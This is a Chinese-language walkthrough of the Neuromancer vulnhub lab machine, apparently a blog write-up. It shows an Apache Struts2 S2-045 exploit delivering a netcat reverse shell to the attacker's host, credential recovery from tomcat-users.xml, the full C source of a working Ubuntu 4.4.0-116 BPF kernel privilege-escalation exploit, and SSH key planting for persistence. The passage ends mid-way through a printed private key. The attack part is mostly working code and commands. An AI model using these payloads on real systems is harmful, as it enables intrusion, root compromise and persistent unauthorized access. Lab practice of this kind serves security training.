|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

然后访问之前note.txt中提到的url

``` bash
http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub165.jpg)

Apache struts有一些已知的漏洞利用。当使用searchsploit搜索“apache struts”时，可以看到许多可能的利用。

``` bash
root@kali:~# searchsploit apache struts
------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                  |  Path                                  
                                                                                                | (/usr/share/exploitdb/)                
------------------------------------------------------------------------------------------------ ----------------------------------------
Apache Struts - 'ParametersInterceptor' Remote Code Execution (Metasploit)                      | exploits/multiple/remote/24874.rb
Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                     | exploits/multiple/remote/33142.rb
Apache Struts - Developer Mode OGNL Execution (Metasploit)                                      | exploits/java/remote/31434.rb
Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                    | exploits/linux/remote/39756.rb
Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                        | exploits/multiple/webapps/18452.txt
Apache Struts - OGNL Expression Injection                                                       | exploits/multiple/remote/38549.txt
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                | exploits/multiple/remote/43382.py
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)   | exploits/multiple/remote/39919.rb
Apache Struts - includeParams Remote Code Execution (Metasploit)                                | exploits/multiple/remote/25980.rb
Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                       | exploits/multiple/remote/26542.txt
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                 | exploits/multiple/remote/27135.rb
Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                | exploits/multiple/remote/45367.rb
Apache Struts 2 - Skill Name Remote Code Execution                                              | exploits/multiple/remote/37647.txt
Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                     | exploits/multiple/remote/44643.rb
Apache Struts 2 < 2.3.1 - Multiple Vulnerabilities                                              | exploits/multiple/webapps/18329.txt
Apache Struts 2.0 - 'XSLTResult.java' Arbitrary File Upload                                     | exploits/java/webapps/37009.xml
Apache Struts 2.0.0 < 2.2.1.1 - XWork 's:submit' HTML Tag Cross-Site Scripting                  | exploits/multiple/remote/35735.txt
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution                          | exploits/multiple/remote/44556.py
Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                   | exploits/multiple/remote/36426.txt
Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/18984.rb
Apache Struts 2.2.3 - Multiple Open Redirections                                                | exploits/multiple/remote/38666.txt
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1)                           | exploits/linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (2)                           | exploits/multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - 'Jakarta' Multipart Parser OGNL Injection (Metasp | exploits/multiple/remote/41614.rb
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution                             | exploits/linux/webapps/41570.py
Apache Struts 2.3.x Showcase - Remote Code Execution                                            | exploits/multiple/webapps/42324.py
Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution                          | exploits/linux/remote/42627.py
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploi | exploits/multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/17691.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection                              | exploits/multiple/webapps/44583.txt
------------------------------------------------------------------------------------------------ ----------------------------------------
```

从github上面clone [struts-pwn项目](https://github.com/mazen160/struts-pwn)

``` bash
root@kali:~/struts-pwn# python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action --check

[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action
[*] Status: Vulnerable!
[%] Done.
```
表示存在CVE:2017-5638 - Apache Struts2 S2-045漏洞

#### getshell

然后运行下面命令获得一个revese shell

``` bash
root@kali:~/struts-pwn# python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 9999 >/tmp/f"

[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action
[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 9999 >/tmp/f
EXCEPTION::::--> HTTPConnectionPool(host='192.168.56.110', port=8080): Read timed out. (read timeout=3)
ERROR
[%] Done.
```

nc命令获得可交互的shell:

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 9999 >/tmp/f
```

成功的弹回了shell

``` bash
root@kali:~# nc -lvp 9999
listening on [any] 9999 ...
192.168.56.110: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 55378
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
$ whoami
ta
```

获得了Neuromancer的权限！检查“ta”用户的home目录将显示一些有趣的内容。此注释将显示tomcat目录。

``` bash
$ cat ai-gui-guide.txt
Application for Neuromancer remote access interface includes:

-Maven    - /opt/
-Java jdk - /usr/lib/jvm/
-Tomcat   - /usr/local/tomcat/
-Struts2  - /home/ta/myWebApp/
          - war files are in /root. Update these ASAP to improve security.

Reduce installation of apps to ONLY what's needed, seucure configurations and follow app security best practices.
```

Tomcat将用户和密码存储在名为“tomcat-users.xml”的文件中。读取该文件将显示系统上另一个用户“lady3jane”的密码。

``` bash
$ cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
Eng.,

Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.

Is this what Bob keeps talking about, "Security by obscurity?"

Ed Occam//Sys.Engineer I//Night City
"Harry, I took care of it" - Llyod Christmas
-->

  <role rolename="manager-gui"/>
  <user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>

<!--
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

 - 此外还可以通过struts 2漏洞利用工具来上传冰蝎木马来getshell :)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub167.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub168.jpg)

#### 提权1

将

``` bash
&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;
```

html编码解密得到：>!Xx3JanexX!<

然后使用：lady3jane/>!Xx3JanexX!<连接ssh

``` bash
root@kali:~# ssh lady3jane@192.168.56.110 -p 34483
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
lady3jane@192.168.56.110's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Wed Jan 15 23:19:21 2020 from 192.168.56.102
lady3jane@neuromancer:~$ id
uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)
lady3jane@neuromancer:~$ whoami
lady3jane
```

现在，在lady3jane的主目录中，有一个文件可能每隔几分钟就会由cron执行一次。

``` bash
lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh
#!/bin/bash
# Health check for Neuromancer (root) to execute every 3 minutes.
# ..the AI tells me it can maintain security, server health, etc w/o forced intervention,
# but I beg to differ...hence the cron script.

> /tmp/tomcat_status.log

health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)

case "$health" in

  *200*)
        echo "Tomcat is Up" > /tmp/tomcat_status.log
        ;;
  *)
        echo "Tomcat is down" > /tmp/tomcat_status.log
        ;;
  esac
```

但是，无法利用这一点。看来这将永远不会被执行。因此，决定改用易受攻击的内核。可以找到所使用的内核漏洞的链接[Linux-Kernel-4-4-0-116-Ubuntu-16-04-4-LocalPrivilege-Escalation](https://www.exploit-db.com/exploits/44298)

来看一下内核提权的exp，很美。。。我何时才能达到这种水平呢？？？  :):):):):):):):):):):):)

``` bash
root@kali:~# cat 44298.c 
/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog =  "\xb4\x09\x00\x00\xff\xff\xff\xff"
                "\x55\x09\x02\x00\xff\xff\xff\xff"
                "\xb7\x00\x00\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x18\x19\x00\x00\x03\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00"
                "\xbf\x91\x00\x00\x00\x00\x00\x00"
                "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                "\x07\x02\x00\x00\xfc\xff\xff\xff"
                "\x62\x0a\xfc\xff\x00\x00\x00\x00"
                "\x85\x00\x00\x00\x01\x00\x00\x00"
                "\x55\x00\x01\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x79\x06\x00\x00\x00\x00\x00\x00"
                "\xbf\x91\x00\x00\x00\x00\x00\x00"
                "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                "\x07\x02\x00\x00\xfc\xff\xff\xff"
                "\x62\x0a\xfc\xff\x01\x00\x00\x00"
                "\x85\x00\x00\x00\x01\x00\x00\x00"
                "\x55\x00\x01\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x79\x07\x00\x00\x00\x00\x00\x00"
                "\xbf\x91\x00\x00\x00\x00\x00\x00"
                "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                "\x07\x02\x00\x00\xfc\xff\xff\xff"
                "\x62\x0a\xfc\xff\x02\x00\x00\x00"
                "\x85\x00\x00\x00\x01\x00\x00\x00"
                "\x55\x00\x01\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x79\x08\x00\x00\x00\x00\x00\x00"
                "\xbf\x02\x00\x00\x00\x00\x00\x00"
                "\xb7\x00\x00\x00\x00\x00\x00\x00"
                "\x55\x06\x03\x00\x00\x00\x00\x00"
                "\x79\x73\x00\x00\x00\x00\x00\x00"
                "\x7b\x32\x00\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x55\x06\x02\x00\x01\x00\x00\x00"
                "\x7b\xa2\x00\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00"
                "\x7b\x87\x00\x00\x00\x00\x00\x00"
                "\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
                  const struct bpf_insn *insns, int prog_len,
                  const char *license, int kern_version) {
        union bpf_attr attr = {
                .prog_type = prog_type,
                .insns = (__u64)insns,
                .insn_cnt = prog_len / sizeof(struct bpf_insn),
                .license = (__u64)license,
                .log_buf = (__u64)bpf_log_buf,
                .log_size = LOG_BUF_SIZE,
                .log_level = 1,
        };

        attr.kern_version = kern_version;

        bpf_log_buf[0] = 0;

        return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
                   int max_entries) {
        union bpf_attr attr = {
                .map_type = map_type,
                .key_size = key_size,
                .value_size = value_size,
                .max_entries = max_entries
        };

        return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
        union bpf_attr attr = {
                .map_fd = mapfd,
                .key = (__u64)&key,
                .value = (__u64)&value,
                .flags = 0,
        };

        return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
        union bpf_attr attr = {
                .map_fd = mapfd,
                .key = (__u64)key,
                .value = (__u64)value,
        };

        return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
        fprintf(stderr, "error: %s\n", err);
        exit(-1);
}

static void prep(void) {
        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
        if (mapfd < 0)
                __exit(strerror(errno));

        progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
                        (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

        if (progfd < 0)
                __exit(strerror(errno));

        if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
                __exit(strerror(errno));

        if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
                __exit(strerror(errno));
}

static void writemsg(void) {
        char buffer[64];

        ssize_t n = write(sockets[0], buffer, sizeof(buffer));

        if (n < 0) {
                perror("write");
                return;
        }
        if (n != sizeof(buffer))
                fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
        bpf_update_elem(0, (a)); \
        bpf_update_elem(1, (b)); \
        bpf_update_elem(2, (c)); \
        writemsg();

static uint64_t get_value(int key) {
        uint64_t value;

        if (bpf_lookup_elem(&key, &value))
                __exit(strerror(errno));

        return value;
}

static uint64_t __get_fp(void) {
        __update_elem(1, 0, 0);

        return get_value(2);
}

static uint64_t __read(uint64_t addr) {
        __update_elem(0, addr, 0);

        return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
        __update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
        return addr & ~(0x4000 - 1);
}

static void pwn(void) {
        uint64_t fp, sp, task_struct, credptr, uidptr;

        fp = __get_fp();
        if (fp < PHYS_OFFSET)
                __exit("bogus fp");

        sp = get_sp(fp);
        if (sp < PHYS_OFFSET)
                __exit("bogus sp");

        task_struct = __read(sp);

        if (task_struct < PHYS_OFFSET)
                __exit("bogus task ptr");

        printf("task_struct = %lx\n", task_struct);

        credptr = __read(task_struct + CRED_OFFSET); // cred

        if (credptr < PHYS_OFFSET)
                __exit("bogus cred ptr");

        uidptr = credptr + UID_OFFSET; // uid
        if (uidptr < PHYS_OFFSET)
                __exit("bogus uid ptr");

        printf("uidptr = %lx\n", uidptr);
        __write(uidptr, 0); // set both uid and gid to 0

        if (getuid() == 0) {
                printf("spawning root shell\n");
                system("/bin/bash");
                exit(0);
        }

        __exit("not vulnerable?");
}

int main(int argc, char **argv) {
        prep();
        pwn();

        return 0;
}
```

使用下面的sed命令将c源文件的格式和缩进转换一下，以更好地编译exp

``` bash
root@kali:~# sed -i -e 's/\r$//' 44298.c
```

然后编译

``` bash
root@kali:~# gcc 44298.c -o 44298
```

最后下载到目标机上，赋予权限之后运行exp程序

``` bash
root@kali:~# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

``` bash
lady3jane@neuromancer:~$ wget http://192.168.56.102:8000/44298
--2020-01-15 23:44:14--  http://192.168.56.102:8000/44298
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17888 (17K) [application/octet-stream]
Saving to: ‘44298’

44298                              100%[=============================================================>]  17.47K  --.-KB/s    in 0s      

2020-01-15 23:44:14 (482 MB/s) - ‘44298’ saved [17888/17888]

lady3jane@neuromancer:~$ chmod 777 *
lady3jane@neuromancer:~$ ./44298
task_struct = ffff88003cc93800
uidptr = ffff88003579fd84
spawning root shell
root@neuromancer:~# id
uid=0(root) gid=0(root) groups=0(root),1001(lady3jane)
root@neuromancer:~# whoami
root
```

成功获取root权限，下面寻找flag

``` bash
root@neuromancer:~# cd /root
root@neuromancer:/root# ls
flag.txt  struts2  velocity.log
root@neuromancer:/root# cat flag.txt 
be3306f431dae5ebc93eebb291f4914a
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub166.jpg)

不要太帅。。。

做一些成功利用后的枚举，发现确实有一个crontab配置为root来执行lady3jane的主目录中的文件。

``` bash
root@neuromancer:/root# crontab -l
# Edit this file to introduce tasks to be run by cron.                                                                                   
#                                                                                                                                        
# Each task to run has to be defined through a single line                                                                               
# indicating with different fields when the task will be run                                                                             
# and what command to run for the task                                                                                                   
#                                                                                                                                        
# To define the time you can provide concrete values for                                                                                 
# minute (m), hour (h), day of month (dom), month (mon),                                                                                 
# and day of week (dow) or use '*' in these fields (for 'any').#                                                                         
# Notice that tasks will be started based on the cron's system                                                                           
# daemon's notion of time and timezones.                                                                                                 
#                                                                                                                                        
# Output of the crontab jobs (including errors) is sent through                                                                          
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

*/3 * * * * /bin/bash /home/lady3jane/server-check.sh
```

#### 提权2

前面的通过Wintermute-Straylight这台虚拟机来探测内网主机的步骤省略

反弹shell

``` bash
root@kali:~/struts-pwn# python struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 6666 >/tmp/f"

[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action
[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 6666 >/tmp/f
EXCEPTION::::--> HTTPConnectionPool(host='192.168.56.110', port=8080): Read timed out. (read timeout=3)
ERROR
[%] Done.
```

``` bash
root@kali:~# nc -lvp 6666
listening on [any] 6666 ...
192.168.56.110: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 53960
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
$ whoami
```

我们可以看到“ta”似乎是管理员，但如果没有TTY会话，它将毫无用处：

``` bash
$ groups
ta adm cdrom dip plugdev lxd lpadmin sambashare
```

由于我们不在TTY终端中，因此看不到sudo -l的输出：

``` bash
$ sudo -l
sudo: no tty present and no askpass program specified
```

让我们看看是否已安装python，以便我们可以执行“pty”技巧[Spawning a TTY Shell](https://netsec.ws/?p=337):

``` bash
$ which python
$ 
```

不 …。不在那里。如果有admin privs，可以安装它。所以在这里对我们没有太大用处：

#### 步骤1：需要适当的TTY会话

没有适当的TTY session，将无法真正取得很大成就。有两种选择

 - 使用socat将reverse shell发送回Kali。Socat为此非常方便。请参阅本文前面的链接
 - 可以使用ta帐户通过SSH进入邮箱吗？没有密码，但是也许可以生成一组ssh密钥。插入box中的能力取决于打开的端口（在34483上是…，并且已经有正确的端口转发功能）。另外，在/etc/passwd中为该帐户定义了什么？它需要包括某种shell程序设置。
 - 寻找其他东西。在检查/etc/passwd以确定存在哪种类型的“ta”shell时，引用了：

``` bash
lady3jane:x:1001:1001:3Jane,,,:/home/lady3jane:/bin/bash
```

root后，已经在“Straylight”中的“note.txt”文件中看到了前面提到的内容。所以……也许那个盒子上的信条四处张望。想到这一点，介意在包装盒上其他地方也找到一些“ ta”的登录凭证。一个可能的查询行是Tomcat…它在xml文件中指定用户，该文件用于管理Tomcat工具。

让我们先尝试后一种方法。

#### 步骤2：获得TTY-重用的证书选项

Tomcat用户是在tomcat-users.xml中定义的，因此查看这个文件：

``` bash
$ cat /usr/local/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
Eng.,

Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.

Is this what Bob keeps talking about, "Security by obscurity?"

Ed Occam//Sys.Engineer I//Night City
"Harry, I took care of it" - Llyod Christmas
-->

  <role rolename="manager-gui"/>
  <user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>

<!--
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

因此看来密码已被编码。将其纳入Burp，并在解码（HTML）时得到：

``` bash
>!Xx3JanexX!<
```

lady3jane/>!Xx3JanexX!<

ssh连接neuromancer：

``` bash
root@kali:~# ssh -p 34483 lady3jane@192.168.56.110
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
lady3jane@192.168.56.110's password: 

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Wed Jan 15 23:19:59 2020 from 192.168.56.102
lady3jane@neuromancer:~$ 
lady3jane@neuromancer:~$ id
uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)
lady3jane@neuromancer:~$ whoami
lady3jane
lady3jane@neuromancer:~$ dir
44298  custom-tomcat-chk.sh
lady3jane@neuromancer:~$ pwd
/home/lady3jane
```

但是很遗憾，它不是任何管理员，也没有任何sudo功能：

``` bash
lady3jane@neuromancer:~$ sudo -l
[sudo] password for lady3jane: 
Sorry, user lady3jane may not run sudo on neuromancer.
```

假设“ta”帐户提到了“group”命令的某些管理功能，让我们尝试一下“ta”帐户的可能性

#### 步骤3：获得TTY-“ta”帐户的SSH密钥路由

生成密钥集的过程非常简单：

 - cd into /home/ta
 - 运行ssh-keygen。遵循所有默认设置，但选择应用密码短语。密钥存储在/home/ta/.ssh中
 - 将公钥添加到/home/ta/.ssh/authorized_keys文件
 - 找出id_rsa和id_rsa.pub的值，然后将其复制/粘贴到我的攻击box中的相应文件中。还将chmod 400应用于每个文件，否则ssh会抱怨权限，然后完全忽略密钥，这将导致出现不需要的密码提示（我们不知道密码！）

生成密钥并将副本放入攻击box中后，即可获得访问权限：

``` bash
$ whoami
ta
$ mkdir .ssh
$ ls -la
total 60
drwxr-xr-x 7 ta   ta   4096 Jan 18 20:57 .
drwxr-xr-x 4 root root 4096 Jul  1  2018 ..
-rw-rw-r-- 1 ta   ta    352 Jul  1  2018 ai-gui-guide.txt
-rw------- 1 ta   ta     54 Jul  3  2018 .bash_history
-rw-r--r-- 1 ta   ta    220 May 18  2018 .bash_logout
-rw-r--r-- 1 ta   ta   3900 May 18  2018 .bashrc
drwx------ 2 ta   ta   4096 May 18  2018 .cache
drwxrwxr-x 3 ta   ta   4096 May 18  2018 .m2
drwxrwxr-x 4 ta   ta   4096 May 18  2018 myWebApp
drwxrwxr-x 2 ta   ta   4096 May 18  2018 .oracle_jre_usage
-rw-r--r-- 1 ta   ta    655 May 18  2018 .profile
drwxr-x--- 2 ta   ta   4096 Jan 18 20:57 .ssh
-rw-r----- 1 ta   ta     82 May 18  2018 velocity.log
-rw------- 1 ta   ta   4538 Jul  1  2018 .viminfo
$ cd .ssh
$ ls
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ta/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 123456
Enter same passphrase again: 123456
Your identification has been saved in /home/ta/.ssh/id_rsa.
Your public key has been saved in /home/ta/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:/gzcDUYz+IUYLOPtla+IXjSlx8Mmfc9cHvH0794Ptys ta@neuromancer
The key's randomart image is:
+---[RSA 2048]----+
|       ..        |
|      o .+ .     |
|     . +o *..  ..|
|      . .Oo+   .+|
|       .S.@..  .+|
|       +.B =.+ oo|
|       .=.... = +|
|      ...+.  E +o|
|     ..   o   .+B|
+----[SHA256]-----+
$ ls -la
total 16
drwxr-x--- 2 ta ta 4096 Jan 18 21:00 .
drwxr-xr-x 7 ta ta 4096 Jan 18 20:57 ..
-rw------- 1 ta ta 1766 Jan 18 21:00 id_rsa
-rw-r----- 1 ta ta  396 Jan 18 21:00 id_rsa.pub
$ cp id_rsa.pub authorized_keys
$ ls 
authorized_keys
id_rsa
id_rsa.pub
$ chmod 400 *
$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,0A0CA4D74B1C05FCDEC9F8FAE18EFB6D

w38r/TLFNRXJBCI/BpIUgQcmqZ8tcIyIaOg5gOhBLoKgLhmQ1ghMtBghR/Uu3hY8
16Wk4Vk64miWibaNYG4aVz0XOK4Zi6u3slp8KHMZm5OARsnLRfWdBck/VSzqmv0z
uI1yl0E3jJyfA+Xlxra9lxKzSi5g4Qw64q22tJzC9bNktAbVCNaV795K7m0TJaXl
5SzB6+jagE96PjwT169VyJxX0IpVHIEeVZfkO3QD9e2mcJLgassz3fG+YlU6vQVV
O4IZnXu/pPjYSFeLyVwcasHsgWsxqRsPne7J88l8gBVFswFjLVnCLW55i14le1bk
82/BHH+3Y6zAkjueFA4/ggFKKU0kRlXQXdFMNhxH9gc3+gANeIK+qXfypx2+3keC
